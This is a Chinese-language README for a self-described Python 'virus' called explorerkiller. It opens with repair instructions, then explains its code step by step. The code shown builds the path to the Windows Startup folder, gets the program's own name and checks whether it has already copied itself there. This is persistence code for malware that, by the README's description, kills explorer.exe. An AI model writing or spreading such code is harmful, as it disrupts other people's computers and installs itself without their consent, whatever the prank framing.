# 文件资源管理器杀手（explorerkiller）
## 简介
这是一个基于python制作并编译的恶意程序。
## 安全提醒
玩归玩，闹归闹，别拿设备开玩笑。假如你不小心（故意不小心）将此病毒运行，其造成的破坏是可以修复的，修复方法：  
1.打开任务管理器（Ctrl+Shift+Esc），运行“explorer.exe”  
2.调出运行菜单（Win+R），输入“shell:startup”并打开，找到本程序并删除文件
## 原理与代码详解
### 导入库
```
import os  
import shutil  
import sys  
import subprocess  
```
os，shutil和sys库：用于获取启动文件夹路径并复制  
subprocess:用于结束文件资源管理器进程  
### 复制到启动文件夹
```
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
```
获取系统的启动文件夹路径  
```
script_name = os.path.basename(sys.argv[0])
```
获取程序名称  
```
def is_file_in_startup_folder(startup_folder, file_name):
    return file_name in os.listdir(startup_folder)
```
检查是否已经复制  




